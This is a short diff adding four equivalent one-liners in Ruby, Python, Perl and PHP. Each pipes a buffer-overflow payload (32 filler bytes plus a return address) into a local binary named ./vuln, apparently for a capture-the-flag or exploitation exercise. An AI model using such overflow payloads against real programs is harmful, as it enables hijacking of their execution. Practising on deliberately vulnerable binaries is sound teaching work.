@@ -1,0 +1,7 @@
+ruby -e 'print "a"*32 + "\x9d\x84\x04\x08"' | ./vuln
+
+python -c 'print "a"*32 + "\x9d\x84\x04\x08"' | ./vuln
+
+perl -e 'print "a"x32 . "\x9d\x84\x04\x08"' | ./vuln
+
+php -r 'echo str_repeat("a",32) . "\x9d\x84\x04\x08";' | ./vuln
